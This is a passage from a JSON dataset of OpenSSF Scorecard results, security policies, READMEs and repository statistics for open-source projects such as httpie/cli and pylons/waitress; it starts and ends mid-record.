                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test-package-linux-snap.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/test-package-linux-snap.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test-package-mac-brew.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/test-package-mac-brew.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/tests.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: extras/packaging/linux/Dockerfile:3: pin your Docker image by updating ubuntu:18.04 to ubuntu:18.04@sha256:152dc042452c496007f07ca9127571cb9c29697f42acbfad72324b2bb2e43c98",
                        "Warn: pipCommand not pinned by hash: extras/packaging/linux/Dockerfile:26",
                        "Warn: pipCommand not pinned by hash: extras/packaging/linux/Dockerfile:27",
                        "Warn: pipCommand not pinned by hash: extras/packaging/linux/Dockerfile:28",
                        "Warn: pipCommand not pinned by hash: .github/workflows/benchmark.yml:24",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs-deploy.yml:21",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-linux-standalone.yml:54",
                        "Info:   0 out of  26 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  10 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   1 containerImage dependencies pinned",
                        "Info:   0 out of   6 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 14 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact 3.2.2 not signed: https://api.github.com/repos/httpie/cli/releases/103665121",
                        "Warn: release artifact 3.2.1 not signed: https://api.github.com/repos/httpie/cli/releases/66196395",
                        "Warn: release artifact 3.2.0 not signed: https://api.github.com/repos/httpie/cli/releases/66163753",
                        "Warn: release artifact 3.1.0 not signed: https://api.github.com/repos/httpie/cli/releases/61214710",
                        "Warn: release artifact 3.2.2 does not have provenance: https://api.github.com/repos/httpie/cli/releases/103665121",
                        "Warn: release artifact 3.2.1 does not have provenance: https://api.github.com/repos/httpie/cli/releases/66196395",
                        "Warn: release artifact 3.2.0 does not have provenance: https://api.github.com/repos/httpie/cli/releases/66163753",
                        "Warn: release artifact 3.1.0 does not have provenance: https://api.github.com/repos/httpie/cli/releases/61214710"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/code-style.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/content.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/coverage.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs-check-markdown.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs-deploy.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-brew.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-choco.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-linux-standalone.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-pypi.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-snap.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test-package-linux-snap.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test-package-mac-brew.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/httpie/cli/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security policy\n\n## Reporting a vulnerability\n\nWhen you identify a vulnerability in HTTPie, please report it privately using one of the following channels:\n\n- Email to [`security@httpie.io`](mailto:security@httpie.io)\n- Report on [huntr.dev](https://huntr.dev/)\n\nIn addition to the description of the vulnerability, include the following information:\n\n- A short reproducer to verify it (it can be a small HTTP server, shell script, docker image, etc.)\n- Your deemed severity level of the vulnerability (`LOW`/`MEDIUM`/`HIGH`/`CRITICAL`)\n- [CWE](https://cwe.mitre.org/) ID, if available.\n",
        "project_all_labels": [
            "awaiting-response",
            "benchmark",
            "blocked by upstream",
            "bug",
            "cli",
            "deferred",
            "dependencies",
            "docs",
            "duplicate",
            "enhancement",
            "error-messages",
            "extensions",
            "good first issue",
            "help wanted",
            "invalid",
            "low-priority",
            "needs product design",
            "new",
            "not-a-bug",
            "packaging",
            "performance",
            "planned",
            "plugins",
            "project-structure",
            "question",
            "sessions",
            "stale",
            "testing",
            "website",
            "windows",
            "wontfix"
        ],
        "README_content": "<h2 align=\"center\">\n    <a href=\"https://httpie.io\" target=\"blank_\">\n        <img height=\"100\" alt=\"HTTPie\" src=\"https://raw.githubusercontent.com/httpie/cli/master/docs/httpie-logo.svg\" />\n    </a>\n    <br>\n    HTTPie CLI: human-friendly HTTP client for the API era\n</h2>\n\n<div align=\"center\">\n\n[![HTTPie for Desktop](https://img.shields.io/static/v1?label=HTTPie&message=Desktop&color=4B78E6)](https://httpie.io/product)\n[![](https://img.shields.io/static/v1?label=HTTPie&message=Web%20%26%20Mobile&color=73DC8C)](https://httpie.io/app)\n[![](https://img.shields.io/static/v1?label=HTTPie&message=CLI&color=FA9BFA)](https://httpie.io/cli)\n[![Twitter](https://img.shields.io/twitter/follow/httpie?style=flat&color=%234B78E6&logoColor=%234B78E6)](https://twitter.com/httpie)\n[![Chat](https://img.shields.io/discord/725351238698270761?style=flat&label=Chat%20on%20Discord&color=%23FA9BFA)](https://httpie.io/discord)\n\n</div>\n\n\n<div align=\"center\">\n\n[![Docs](https://img.shields.io/badge/stable%20docs-httpie.io%2Fdocs%2Fcli-brightgreen?style=flat&color=%2373DC8C&label=Docs)](https://httpie.org/docs/cli)\n[![Latest version](https://img.shields.io/pypi/v/httpie.svg?style=flat&label=Latest&color=%234B78E6&logo=&logoColor=white)](https://pypi.python.org/pypi/httpie)\n[![Build](https://img.shields.io/github/actions/workflow/status/httpie/cli/tests.yml?branch=master&color=%23FA9BFA&label=Build)](https://github.com/httpie/cli/actions)\n[![Coverage](https://img.shields.io/codecov/c/github/httpie/cli?style=flat&label=Coverage&color=%2373DC8C)](https://codecov.io/gh/httpie/cli)\n[![PyPi downloads](https://img.shields.io/pepy/dt/httpie?style=flat&label=Downloads%20from%20PyPi%20only&color=4B78E6)](https://www.pepy.tech/projects/httpie)\n\n</div>\n\nHTTPie (pronounced _aitch-tee-tee-pie_) is a command-line HTTP client.\nIts goal is to make CLI interaction with web services as human-friendly as possible.\nHTTPie is designed for testing, debugging, and generally interacting with APIs & HTTP servers.\nThe `http` & `https` commands allow for creating and sending arbitrary HTTP requests.\nThey use simple and natural syntax and provide formatted and colorized output.\n\n<div align=\"center\">\n\n<img src=\"https://raw.githubusercontent.com/httpie/cli/master/docs/httpie-animation.gif\" alt=\"HTTPie in action\" width=\"100%\"/>\n\n\n</div>\n\n\n\n\n## We lost 54k GitHub stars\n\nPlease note we recently accidentally made this repo private for a moment, and GitHub deleted our community that took a decade to build. Read the full story here: https://httpie.io/blog/stardust\n\n![](docs/stardust.png)\n\n\n## Getting started\n\n- [Installation instructions →](https://httpie.io/docs#installation)\n- [Full documentation →](https://httpie.io/docs)\n\n## Features\n\n- Expressive and intuitive syntax\n- Formatted and colorized terminal output\n- Built-in JSON support\n- Forms and file uploads\n- HTTPS, proxies, and authentication\n- Arbitrary request data\n- Custom headers\n- Persistent sessions\n- `wget`-like downloads\n\n[See all features →](https://httpie.io/docs)\n\n## Examples\n\nHello World:\n\n```bash\nhttps httpie.io/hello\n```\n\nCustom [HTTP method](https://httpie.io/docs#http-method), [HTTP headers](https://httpie.io/docs#http-headers) and [JSON](https://httpie.io/docs#json) data:\n\n```bash\nhttp PUT pie.dev/put X-API-Token:123 name=John\n```\n\nBuild and print a request without sending it using [offline mode](https://httpie.io/docs/cli/offline-mode):\n\n```bash\nhttp --offline pie.dev/post hello=offline\n```\n\nUse [GitHub API](https://developer.github.com/v3/issues/comments/#create-a-comment) to post a comment on an [Issue](https://github.com/httpie/cli/issues/83) with [authentication](https://httpie.io/docs#authentication):\n\n```bash\nhttp -a USERNAME POST https://api.github.com/repos/httpie/cli/issues/83/comments body='HTTPie is awesome! :heart:'\n```\n\n[See more examples →](https://httpie.io/docs#examples)\n\n## Community & support\n\n- Visit the [HTTPie website](https://httpie.io) for full documentation and useful links.\n- Join our [Discord server](https://httpie.io/discord) is to ask questions, discuss features, and for general API chat.\n- Tweet at [@httpie](https://twitter.com/httpie) on Twitter.\n- Use [StackOverflow](https://stackoverflow.com/questions/tagged/httpie) to ask questions and include a `httpie` tag.\n- Create [GitHub Issues](https://github.com/httpie/cli/issues) for bug reports and feature requests.\n- Subscribe to the [HTTPie newsletter](https://httpie.io) for occasional updates.\n\n## Contributing\n\nHave a look through existing [Issues](https://github.com/httpie/cli/issues) and [Pull Requests](https://github.com/httpie/cli/pulls) that you could help with. If you'd like to request a feature or report a bug, please [create a GitHub Issue](https://github.com/httpie/cli/issues) using one of the templates provided.\n\n[See contribution guide →](https://github.com/httpie/cli/blob/master/CONTRIBUTING.md)\n",
        "num_commits": 1787,
        "project_age_days": 4630,
        "project_created_at": "2012-02-25",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 149,
        "num_pull": 615,
        "num_issues": 1491,
        "num_opening_issue": 182,
        "project_size(kB)": 6898,
        "num_stargazers": 33780,
        "num_watchers": 33780,
        "num_forks": 3676,
        "num_subscribers": 85,
        "SecurityPolicy_created_at": "2022-03-07 20:29:48",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "59d9e928f8a6de4bd78e9e11adbabf9de9207d45",
                "url": "https://github.com/httpie/cli/commit/59d9e928f8a6de4bd78e9e11adbabf9de9207d45",
                "date": "2022-03-07 20:29:48"
            },
            {
                "commit_id": "0a873172c95404b43387c1a4302eecc1cdb8379e",
                "url": "https://github.com/httpie/cli/commit/0a873172c95404b43387c1a4302eecc1cdb8379e",
                "date": "2022-03-07 20:29:48"
            },
            {
                "commit_id": "395914fb4d439ce5220a44af231d3e16bf3fe18d",
                "url": "https://github.com/httpie/cli/commit/395914fb4d439ce5220a44af231d3e16bf3fe18d",
                "date": "2022-03-07 20:29:48"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email_external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "pylons/waitress",
        "project_url": "https://github.com/pylons/waitress",
        "SSF": {
            "date": "2024-10-29T23:04:59+07:00",
            "repo": {
                "name": "github.com/pylons/waitress",
                "commit": "ae949bb428e50cf04152db56460f31c1e6d3a2a9"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 8,
                    "reason": "5 out of 6 merged PRs checked by a CI test -- score normalized to 8",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 1/17 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: usingnamespace contributor org/company found, ptahproject contributor org/company found, pyramid-collective contributor org/company found, clinical ink contributor org/company found, dabapps contributor org/company found, BrumCodeJo contributor org/company found, mongodb contributor org/company found, theasylum contributor org/company found, Supervisor contributor org/company found, repoze contributor org/company found, agendaless consulting contributor org/company found, codeinn contributor org/company found, rhodecode contributor org/company found, CampFireManager contributor org/company found, dafizilla contributor org/company found, Pylons contributor org/company found, Shoobx contributor org/company found, knop-project contributor org/company found, zopefoundation contributor org/company found, colossaldynamics contributor org/company found, workday contributor org/company found, buildout contributor org/company found, collective contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 23 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "9 commit(s) and 3 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:80: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:82: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:100: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:102: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:113: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:115: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:125: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests.yml:127: update your workflow using https://app.stepsecurity.io/secureworkflow/Pylons/waitress/ci-tests.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests.yml:132",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests.yml:87",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests.yml:108",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests.yml:120",
                        "Info:   0 out of   8 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   4 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 19 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/Pylons/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/Pylons/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/Pylons/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/Pylons/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/ci-tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/Pylons/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nTo report security issues with projects under the Pylons Project, send email to: pylons-project-security@googlegroups.com.\nIf we determine that your report may be a security issue with the project, we may contact you for further information.\nWe volunteers ask that you delay public disclosure of your report for at least ninety (90) days from the date you report it to us.\nThis will allow sufficient time for us to process your report and coordinate disclosure with you.\n\nOnce verified and fixed, the following steps will be taken.\n\n-   We will use GitHub's Security Advisory tool to report the issue.\n-   GitHub will review our Security Advisory report for compliance with Common Vulnerabilities and Exposures (CVE) rules.\n    If it is compliant, they will submit it to the MITRE Corporation to generate a [CVE](https://www.cve.org/).\n    This in turn submits the CVE to the [National Vulnerability Database (NVD)](https://nvd.nist.gov/vuln/search).\n    GitHub notifies us of their decision.\n-   Assuming it is compliant, we then publish our Security Advisory on GitHub, which triggers the next steps.\n-   GitHub will publish the CVE to the CVE List.\n-   GitHub will broadcast our Security Advisory via the [GitHub Advisory Database](https://github.com/advisories).\n-   GitHub will send [security alerts](https://docs.github.com/en/code-security/supply-chain-security/managing-vulnerabilities-in-your-projects-dependencies/about-alerts-for-vulnerable-dependencies) to all repositories that use our package (and have opted into security alerts).\n    This includes Dependabot alerts.\n-   We will make a bug-fix release.\n-   We will send an announcement through our usual channels, including those listed on the Pylons Project website's [Contact](https://pylonsproject.org/about-contact.html) page.\n-   We will provide credit to the reporter or researcher in the vulnerability notice.\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "docs",
            "enhancement",
            "sprintable"
        ],
        "README_content": "Waitress\n========\n\n.. image:: https://img.shields.io/pypi/v/waitress.svg\n    :target: https://pypi.org/project/waitress/\n    :alt: latest version of waitress on PyPI\n\n.. image:: https://github.com/Pylons/waitress/actions/workflows/ci-tests.yml/badge.svg\n    :target: https://github.com/Pylons/waitress/actions/workflows/ci-tests.yml\n\n.. image:: https://readthedocs.org/projects/waitress/badge/?version=stable\n        :target: https://docs.pylonsproject.org/projects/waitress/en/stable/\n        :alt: main Documentation Status\n\nWaitress is a production-quality pure-Python WSGI server with very acceptable\nperformance. It has no dependencies except ones which live in the Python\nstandard library. It runs on CPython on Unix and Windows under Python 3.9+. It\nis also known to run on PyPy 3 (version 3.9 compatible python and above) on\nUNIX. It supports HTTP/1.0 and HTTP/1.1.\n\nFor more information, see the \"docs\" directory of the Waitress package or visit\nhttps://docs.pylonsproject.org/projects/waitress/en/latest/\n",
        "num_commits": 1036,
        "project_age_days": 4700,
        "project_created_at": "2011-12-17",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 50,
        "num_pull": 206,
        "num_issues": 445,
        "num_opening_issue": 19,
        "project_size(kB)": 1778,
        "num_stargazers": 1442,
        "num_watchers": 1442,
        "num_forks": 165,
        "num_subscribers": 38,
        "SecurityPolicy_created_at": "2022-03-13 08:20:20",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "ab14abef44c69ff35e9b9cc58379a8c97c71eaf8",
                "url": "https://github.com/Pylons/.github/commit/ab14abef44c69ff35e9b9cc58379a8c97c71eaf8",
                "date": "2022-03-17 01:20:43"
            },
            {
                "commit_id": "a066e581a373c17e7a9ce58b215b2308272c940e",
                "url": "https://github.com/Pylons/.github/commit/a066e581a373c17e7a9ce58b215b2308272c940e",
                "date": "2022-03-16 05:35:12"
            },
            {
                "commit_id": "ce347b2da70eae5aad5c99c563e7835df4addb31",
                "url": "https://github.com/Pylons/.github/commit/ce347b2da70eae5aad5c99c563e7835df4addb31",
                "date": "2022-03-13 08:20:20"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "plone/products.isurlinportal",
        "project_url": "https://github.com/plone/products.isurlinportal",
        "SSF": {
            "date": "2024-10-30T00:39:04+07:00",
            "repo": {
                "name": "github.com/plone/products.isurlinportal",
                "commit": "fd7cb2cf8382bc27e99ca7d37dc512764cc6de92"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "11 out of 11 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 0/10 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
